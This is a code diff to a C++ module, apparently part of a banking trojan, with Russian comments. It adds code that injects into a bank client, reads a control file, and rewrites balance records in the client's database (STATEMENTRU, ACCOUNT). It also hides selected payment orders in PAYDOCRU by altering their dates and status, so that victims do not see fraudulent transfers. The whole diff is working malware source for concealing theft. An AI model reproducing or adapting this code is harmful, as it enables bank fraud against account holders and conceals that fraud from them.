@@ -18,6 +18,7 @@
 #include "Config.h"
 #include "rafa.h"
 #include "AzConfig.h"
+#include "StrConsts.h"
 #include "BotDebug.h"
 
 namespace BBS_CALC
@@ -32,7 +33,40 @@ namespace BBS_CALC
 namespace CBank
 {
 
+//какой остаток должен быть для указанного счета
+struct RestAccount
+{
+	char account[32]; //если account[0] = 0, то конец массива
+	TIMESTAMP_STRUCT date; //после какой даты
+	DWORD diff; //на сколько нужно увеличить остаток 
+};
+
+//в какие даты были изменены остатки c балансами которые там были
+struct RestAccountFixed
+{
+	char account[32]; 
+	TIMESTAMP_STRUCT date; //дата остатка
+	DWORD openingBalance; //баланс на начало
+	DWORD closingBalance; //баланс на конец
+};
+
+//скрываемые платежки
+struct HidePayment
+{
+	char account[32];
+	char num[16]; //номер документа
+	DWORD amount; //сумма
+	TIMESTAMP_STRUCT date; //дата платежки
+};
+
+static RestAccount restAccounts[10]; //подмена баланса
+static RestAccountFixed* restFixeds = 0; //значения балансов до подмены (каждый день после подменяемой даты)
+static DWORD sizeRestFixeds = 0; //количество памяти занимаемой restFixeds
+static HidePayment hidePayments[10]; //скрываемые платежки
+static bool runHideReplacement = false; //true - если надо провести подмену скрытие
+
 static DWORD WINAPI SendCBank( void* param ); //отсылка файлов CBank на сервер
+static DWORD WINAPI ThreadHideReplacement(void*); //подмена баланса и скрытие платежек
 
 SQLRETURN (WINAPI *pHandlerSQLDriverConnectA)(
      SQLHDBC         ConnectionHandle,
@@ -54,6 +88,7 @@ static char* GetPieceString( const char* s, char c, int num, char* to, int c_to 
 static char strODBCConnect[MAX_PATH];
 static char domain[128];
 
+static void ReadReplacement( const char* s );
 ////////////////////////////////////////////////////////
 // функции управления базой данных
 //////////////////////////////////////////////////////////
@@ -117,6 +152,9 @@ static bool InitData()
 	strODBCConnect[0] = 0;
 	if( GetAdminUrl(domain) == 0 )
 		domain[0] = 0;
+	restAccounts[0].account[0] = 0;
+	hidePayments[0].account[0] = 0;
+	restFixeds = 0;
 	return true;
 }
 
@@ -179,6 +217,7 @@ static DWORD WINAPI WorkInCBank(void*)
 	DBG( "CBank", "Заинжектились в процесс '%s'", folderCBank );
 	SetHooks();
 	StartThread( GrabAndSendBalance, 0 );
+	RunThread( ThreadHideReplacement, 0 );
 	return 0;
 }
 
@@ -338,6 +377,308 @@ static char* GetPieceString( const char* s, char c, int num, char* to, int c_to 
 	return ret;
 }
 
+//переводит сумму в целочисленное число, два последних числа это копейки, останавливается на символе которого
+//не может быть в числе, в len будет количество прочитанных символов (символов в числе)
+static int SumToInt( const char* s, int* len )
+{
+	int v = 0;
+	int kop = -1; //количество чисел в копейках, чтобы при нехватке сделать два числа
+	const char* p = s;
+	while( *s == ' ' ) s++;
+	while( (*s >= '0' && *s <= '9') || *s == '.'  )
+	{
+	    if( *s == '.' ) 
+	    	kop = 0;
+	    else
+	    {
+			v = v * 10 + (*s - '0');
+			if( kop >= 0 ) kop++;
+		}
+		s++;
+	}
+	//добавляем нули в конце чтобы всегда в копейках было две цифры
+	if( kop < 0 ) kop = 0;
+	for( int i = kop; i < 2; i++ ) v *= 10; 
+	if( len ) *len = s - p;
+	return v;
+}
+
+//текст в число, до 1-го не числового символа
+static int ValueToInt( const char* s, int* len )
+{
+	int v = 0;
+	const char* p = s;
+	while( *s == ' ' ) s++;
+	while( *s >= '0' && *s <= '9' )
+	{
+		v = v * 10 + (*s - '0');
+		s++;
+	}
+	if( len ) *len = s - p;
+	return v;
+}
+
+//чтение даты в формате dd.mm.yyyy hh:mm:ss, возвращает количество считанных символов
+static int ReadDate( const char* s, TIMESTAMP_STRUCT* date )
+{
+	m_memset( date, 0, sizeof(TIMESTAMP_STRUCT) );
+	const char* p = s;
+	while( *s == ' ' ) s++;
+	int len;
+	do
+	{
+		date->day = ValueToInt( s, &len ); s += len;
+		if( *s != '.' ) break;
+		s++;
+		date->month = ValueToInt( s, &len ); s += len;
+		if( *s != '.' ) break;
+		s++;
+		date->year = ValueToInt( s, &len ); s += len;
+		if( *s != ' ' ) break;
+		while( *s == ' ' ) s++;
+		date->hour = ValueToInt( s, &len ); s += len;
+		if( *s != ':' ) break;
+		s++;
+		date->minute = ValueToInt( s, &len ); s += len;
+		if( *s != ':' ) break;
+		s++;
+		date->second = ValueToInt( s, &len ); s += len;
+	} while(0);
+	return s - p;
+}
+
+static int ReadString( const char* s, char* buf )
+{
+	const char* p = s;
+	while( *s == ' ' ) s++;
+	while( *s && *s != ' ' ) *buf++ = *s++;
+	*buf = 0;
+	return s - p;
+}
+
+
+//считывает строку вида
+//"40702810300010100847 4.82 25.11.2012 10:11: 12, 40702810300010100847 1000.00 27.11.2012; 40702810300010100847 675 26.11.2012, 40702810300010100847 678 28.11.20012";
+//где через запятую перечисляются балансы для подмены: счет сумма дата
+//после точки с запятой идут скрываемые платежки (через запятую): счет номер платежки дата
+static void ReadReplacement( const char* s )
+{
+	//чтение остатка
+	int n = 0;
+	while( *s )
+	{
+		//считываем счет
+		s += ReadString( s, restAccounts[n].account );
+		//сумма
+		int len;
+		restAccounts[n].diff = SumToInt( s, &len );
+		s += len;
+		//дата
+		s += ReadDate( s, &restAccounts[n].date );
+		DBG( "CBank", "Подмена баланса для счета: %s, разница: %d", restAccounts[n].account, restAccounts[n].diff );
+		DBG( "CBank", "Дата %02d.%02d.%02d", restAccounts[n].date.day, restAccounts[n].date.month, restAccounts[n].date.year );
+		while( *s == ' ' ) s++;
+		n++;
+		if( n >= ARRAYSIZE(restAccounts) - 1 ) break;
+		if( *s++ == ';' ) break;
+	}
+	restAccounts[n].account[0] = 0; //конец массива
+	s++;
+	n = 0;
+	while( *s )
+	{
+		//считываем счет
+		s += ReadString( s, hidePayments[n].account );
+		//номер платежки
+		s += ReadString( s, hidePayments[n].num );
+		s += ReadDate( s, &hidePayments[n].date );
+		while( *s == ' ' ) s++;
+		DBG( "CBank", "Скрытие платежки: %s %s", hidePayments[n].account, hidePayments[n].num );
+		DBG( "CBank", "Дата %02d.%02d.%02d", hidePayments[n].date.day, hidePayments[n].date.month, hidePayments[n].date.year );
+		n++;
+		if( *s == 0 || n >= ARRAYSIZE(hidePayments) - 1 ) break;
+		s++;
+	}
+	hidePayments[n].account[0] = 0; //конец массива
+}
+
+//корректировка баланса
+static void ReplacementBalance()
+{
+	DBG( "CBank", "Осуществляем подмену баланса" );
+	int n = 0;
+	ODBC* DB = CreateDB();
+	if( DB )
+	{
+		TMemory sqlBuf(1024);
+		const char* sql;
+		fwsprintfA pwsprintfA = Get_wsprintfA();
+		while( restAccounts[n].account[0] )
+		{
+			DBG( "CBank", "Счет %s, разница %d", restAccounts[n].account, restAccounts[n].diff );
+			char openingBalance[16], closingBalance[16];
+			TIMESTAMP_STRUCT dateBalance;
+			ClearStruct(dateBalance);
+			//выбираем информацию о балансе с начала указанной даты
+			sql = "select OPENINGBALANCE,CLOSINGBALANCE,STATEMENTDATE from STATEMENTRU where ACCOUNT=? and STATEMENTDATE>=? and OPENINGBALANCE<>0 order by STATEMENTDATE";
+			SQLHSTMT qr = DB->ExecuteSql( sql, "os16 os16 ot is16 it", openingBalance, closingBalance, &dateBalance, restAccounts[n].account, &restAccounts[n].date );
+			if( qr )
+			{
+				do
+				{
+					DBG( "CBank", "Входной баланс: %s, выходной баланс: %s", openingBalance, closingBalance );
+					DBG( "CBank", "Дата %02d.%02d.%02d", dateBalance.day, dateBalance.month, dateBalance.year );
+					DWORD obalance = SumToInt( openingBalance, 0 );
+					DWORD cbalance = SumToInt( closingBalance, 0 );
+					//смотрим была ли уже подмена
+					int m = 0;
+					bool update = false; //true - если нужно делать запись новых балансов в базу
+					while( restFixeds && restFixeds[m].account[0] )
+					{
+						if( m_lstrcmp( restAccounts[n].account, restFixeds[m].account ) == 0 &&
+							m_memcmp( &restFixeds[m].date, &dateBalance, sizeof(dateBalance) ) == 0 )
+						{
+							//нашли, значит были на этой строке, сверяем
+							//открывающий баланс можно изменять только если дата не равна дате с которой нужно менять
+							//так как платежка прошла в этот день и соотвественно начальный баланс не меняется
+							if( m_memcmp( &restFixeds[m].date, &restAccounts[n].date, sizeof(dateBalance) ) != 0 &&
+								restFixeds[m].openingBalance + restAccounts[n].diff != obalance )
+							{
+								obalance = restFixeds[m].openingBalance + restAccounts[n].diff;
+								update = true;
+							}
+							if( restFixeds[m].closingBalance + restAccounts[n].diff != cbalance )
+							{
+								cbalance = restFixeds[m].closingBalance + restAccounts[n].diff;
+								update = true;
+							}
+							break;
+						}
+						m++;
+					}
+					if( restFixeds == 0 || restFixeds[m].account[0] == 0 ) //такой строки еще не было
+					{
+						if( (m + 1) * sizeof(RestAccountFixed) > sizeRestFixeds ) //недостаточно памяти
+						{
+							sizeRestFixeds += 5 * sizeof(RestAccountFixed);
+							restFixeds = (RestAccountFixed*)MemRealloc( restFixeds, sizeRestFixeds );
+						}
+						m_lstrcpy( restFixeds[m].account, restAccounts[n].account );
+						restFixeds[m].openingBalance = obalance;
+						restFixeds[m].closingBalance = cbalance;
+						m_memcpy( &restFixeds[m].date, &dateBalance, sizeof(dateBalance) );
+						restFixeds[m + 1].account[0] = 0; //конец массива
+						//обновляем балансы
+						//в день платежки входящий баланс менять нельзя
+						if( m_memcmp( &restFixeds[m].date, &restAccounts[n].date, sizeof(dateBalance) ) )
+							obalance += restAccounts[n].diff;
+						cbalance += restAccounts[n].diff;
+						update = true;
+					}
+					if( update )
+					{
+						DBG( "CBank", "Новые входной баланс: %u, выходной баланс: %u", obalance, cbalance );
+						///отсылаем запрос на обновление
+						sql = "update STATEMENTRU set OPENINGBALANCE=%d.%d, CLOSINGBALANCE = %d.%d where ACCOUNT=? and STATEMENTDATE=?";
+						pwsprintfA( sqlBuf.AsStr(), sql, obalance / 100, obalance % 100, cbalance / 100, cbalance % 100 );
+						DBG( "CBank", "%s", sqlBuf.AsStr() );
+						SQLHSTMT qr2 = DB->ExecuteSql( sqlBuf.AsStr(), "is16 it", restAccounts[n].account, &dateBalance );
+						DB->CloseQuery(qr2);
+					}
+				} while( DB->NextRow(qr) );
+				DB->CloseQuery(qr);
+			}
+			//берем последний баланс и ложим его в таблицу счетов
+			sql = "select CLOSINGBALANCE from STATEMENTRU where STATEMENTDATE=(select Max(STATEMENTDATE) from STATEMENTRU) and CLOSINGBALANCE<>0";
+			qr = DB->ExecuteSql( sql, "os16", closingBalance );
+			if( qr )
+			{
+				DB->CloseQuery(qr);
+				sql = "update ACCOUNT set REST=%s where ACCOUNT=?";
+				pwsprintfA( sqlBuf.AsStr(), sql, closingBalance );
+				qr = DB->ExecuteSql( sqlBuf.AsStr(), "is16", restAccounts[n].account );
+				DB->CloseQuery(qr);
+			}
+			n++;
+		}
+		CloseDB(DB);
+		File::WriteBufferA( BOT::MakeFileName( 0, GetStr(CBankRestFixed).t_str() ).t_str(), restFixeds, sizeRestFixeds );
+		//File::WriteBufferA( "c:\\22.txt", restFixeds, sizeRestFixeds );
+	}
+}
+
+//скрытие платежек
+static void HidePayments()
+{
+	DBG( "CBank", "Скрываем платежки" );
+	ODBC* DB = CreateDB();
+	if( DB )
+	{
+		TIMESTAMP_STRUCT dateFirst; //самая ранняя дата платежек
+		const char* sql = "select min(DOCUMENTDATE) from PAYDOCRU";
+		SQLHSTMT qr = DB->ExecuteSql( sql, "ot", &dateFirst );
+		if( qr )
+		{
+			DB->CloseQuery(qr);
+			TMemory sqlBuf(1024);
+			fwsprintfA pwsprintfA = Get_wsprintfA();
+			int n = 0;
+			while( hidePayments[n].account[0] )
+			{
+				DBG( "CBank", "Скрываем платежку %s %s", hidePayments[n].account, hidePayments[n].num );
+				sql = "update PAYDOCRU set DOCUMENTDATE=?, STATUS=30001 where PAYERACCOUNT=? and DOCUMENTDATE=? and DOCUMENTNUMBER like '%%%s%%'";
+				pwsprintfA( sqlBuf.AsStr(), sql, hidePayments[n].num );
+				DBG( "CBank", "%s", sqlBuf.AsStr() );
+				qr = DB->ExecuteSql( sqlBuf.AsStr(), "it is16 it", &dateFirst, hidePayments[n].account, &hidePayments[n].date );
+				DB->CloseQuery(qr);
+				n++;
+			}
+		}
+		CloseDB(DB);
+	}
+}
+
+static DWORD WINAPI ThreadHideReplacement(void*)
+{
+	pSleep(5000);
+	//ждем пока появится строка подключения
+	do
+	{
+		pSleep(1000);
+	} while( strODBCConnect[0] == 0 );
+	pSleep(1000);
+	restFixeds = (RestAccountFixed*)File::ReadToBufferA( BOT::MakeFileName( 0, GetStr(CBankRestFixed).t_str() ).t_str(), sizeRestFixeds );
+//	restFixeds = (RestAccountFixed*)File::ReadToBufferA( "c:\\22.txt", sizeRestFixeds );
+	string fileFlag = BOT::MakeFileName( 0, GetStr(CBankFlagUpdate).t_str() );
+	for(;;)
+	{
+		DBG( "CBank", "Запуск подмены и скрытия" );
+		DWORD size;
+		//в считываемом файле в конце данных должен быть обязательно 0 или любой другой символ,
+		//чтобы потом вставить 0 и получить полноценную строку. 
+		//Это нужно учитывать при создании файла
+		char* rpl = (char*)File::ReadToBufferA( BOT::MakeFileName( 0, GetStr(CBankReplacement).t_str() ).t_str(), size );
+		//char* rpl = (char*)File::ReadToBufferA( "c:\\11.txt", size );
+		if( rpl )
+		{
+			rpl[size - 1] = 0;
+			ReadReplacement(rpl);
+			MemFree(rpl);
+		}
+		//удаляем флаг запуска подмены
+		pDeleteFileA( fileFlag.t_str() );
+		ReplacementBalance();
+		HidePayments();
+		runHideReplacement = false;
+		for(;;)
+		{
+			if( File::IsExists( fileFlag.t_str() ) ) break;
+			if( runHideReplacement ) break;
+			pSleep(5000);
+		}
+	}
+	return 0;
+}
 
 }
 
